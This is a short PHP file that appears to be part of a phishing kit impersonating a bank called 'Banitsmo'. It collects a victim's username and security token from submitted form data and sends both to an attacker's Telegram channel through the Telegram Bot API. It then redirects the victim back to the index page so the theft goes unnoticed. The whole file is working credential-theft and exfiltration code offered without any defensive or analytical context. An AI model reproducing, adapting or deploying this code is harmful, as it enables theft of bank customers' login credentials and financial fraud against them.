<?php

include('dt.php');

if (isset($_GET['persona']) && isset($_POST['token'])) {

    $message = "::Banitsmo::\r\n Usuario.: " . $_GET['persona'] . "\r\n Token.: " . $_POST['token'];

    $apiToken = $apibot;
    $data = [
        'chat_id' => $canal,
        'text' => $message
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
}
////////////////////
?>
<script>
    window.location.href = "index.php"
</script>